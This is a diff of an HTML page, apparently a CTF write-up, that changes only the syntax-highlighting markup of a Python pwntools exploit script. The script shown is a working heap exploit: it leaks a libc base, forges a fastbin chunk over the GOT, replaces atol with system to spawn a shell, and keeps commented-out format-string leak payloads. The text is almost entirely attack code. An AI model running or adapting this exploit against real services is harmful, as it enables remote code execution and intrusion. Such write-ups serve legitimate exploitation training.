@@ -441,26 +441,26 @@ gdb-peda$
 <span class="c1">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"
 </span><span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">"./libc-2.19_15.so"</span>
 
-<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
-</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
+<span class="n">context</span><span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
 </span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
 </span><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">LIBC_PATH</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">add_data</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">lsf</span><span class="p">):</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">seq</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Offset: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">off</span><span class="p">))</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Yes/No: "</span><span class="p">,</span> <span class="n">lsf</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">seq</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Offset: "</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">off</span><span class="p">))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Data: "</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Yes/No: "</span><span class="p">,</span> <span class="n">lsf</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">convert</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
     <span class="n">ret</span> <span class="o">=</span> <span class="s">""</span>
     <span class="k">while</span> <span class="n">num</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
         <span class="n">now</span> <span class="o">=</span> <span class="n">num</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
         <span class="n">num</span> <span class="o">&gt;&gt;=</span> <span class="mi">8</span>
-        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">'{:02x}'</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
-    <span class="k">return</span> <span class="n">ret</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+        <span class="n">ret</span> <span class="o">=</span> <span class="n">ret</span> <span class="o">+</span> <span class="s">'{:02x}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">now</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">ret</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">16</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
     
@@ -468,16 +468,16 @@ gdb-peda$
     <span class="c1">#r = process(ELF_PATH)
 </span>    
     <span class="n">add_data</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="s">"1"</span><span class="o">*</span><span class="mh">0x90</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Assembled [seq: 1]: "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Assembled [seq: 1]: "</span><span class="p">)</span>
     <span class="c1"># leak libc address
 </span>    <span class="n">addr</span> <span class="o">=</span> <span class="mi">0</span>
     <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
-        <span class="n">addr</span> <span class="o">|=</span> <span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>
+        <span class="n">addr</span> <span class="o">|=</span> <span class="p">((</span><span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="mi">16</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">))</span>
     
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"addr: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"addr: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">addr</span><span class="p">))</span>
     <span class="c1"># libc.address = addr - 0x3c3b78 # local
-</span>    <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x3be7b8</span> <span class="c1"># remote
-</span>    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">))</span>
+</span>    <span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">-</span> <span class="mh">0x3be7b8</span> <span class="c1"># remote
+</span>    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"libc_base: "</span> <span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
     <span class="c1"># gdb.attach(r, gdbscript=open('./ggg', 'r'))
 </span>    <span class="c1"># arrange heap
 </span>    <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s">"2"</span><span class="o">*</span><span class="mh">0xb0</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
@@ -488,7 +488,7 @@ gdb-peda$
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x604042</span><span class="p">)</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">*</span> <span class="mi">6</span>
     <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x31</span><span class="p">)</span>
-    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x58</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x58</span><span class="o">*</span><span class="mi">2</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
     <span class="n">add_data</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x60</span><span class="o">-</span><span class="mh">0x8</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="s">'Yes'</span><span class="p">)</span>
     <span class="c1"># now fastbin (size=0x40) has fake chunk @ got
 </span>    <span class="c1"># allocate the fake chunk
@@ -496,23 +496,23 @@ gdb-peda$
 </span>    <span class="n">payload</span> <span class="o">=</span> <span class="s">"6"</span><span class="o">*</span><span class="mi">12</span> <span class="c1"># libc_start_main
 </span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x400b26</span><span class="p">)</span> <span class="c1"># resolve fgets
 </span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="mh">0x400b36</span><span class="p">)</span> <span class="c1"># resolve strlen
-</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="c1"># hijack atol
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">convert</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">])</span> <span class="c1"># hijack atol
 </span>    <span class="c1">#payload += convert(elf.plt['printf']) # use format string to leak libc info
-</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
+</span>    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">110</span><span class="p">,</span> <span class="s">'0'</span><span class="p">)</span>
     <span class="n">add_data</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="s">'No'</span><span class="p">)</span>
     
     <span class="c1"># hijack atol, send "sh" to get shell
-</span>    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">)</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell!: "</span><span class="p">)</span>
-    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span>    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"SEQ #:"</span><span class="p">,</span> <span class="s">"sh"</span><span class="p">)</span>
+    <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"get shell!: "</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
     <span class="c1"># for exploiting format string &amp; leak libc info
 </span>    <span class="s">"""
-    payload = "</span><span class="si">%10</span><span class="s">$s.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p" + p64(elf.got['fgets'])
+    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['fgets'])
     r.sendlineafter("SEQ #:", payload)
     r.recv(1)
     print "fgets:", hex(u64(r.recv(6).ljust(8, '</span><span class="se">\x00</span><span class="s">')))
-    payload = "</span><span class="si">%10</span><span class="s">$s.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p.</span><span class="si">%</span><span class="s">p" + p64(elf.got['puts'])
+    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['puts'])
     r.sendlineafter("Offset:", payload)
     r.recv(1)
     print "puts:", hex(u64(r.recv(6).ljust(8, '</span><span class="se">\x00</span><span class="s">')))
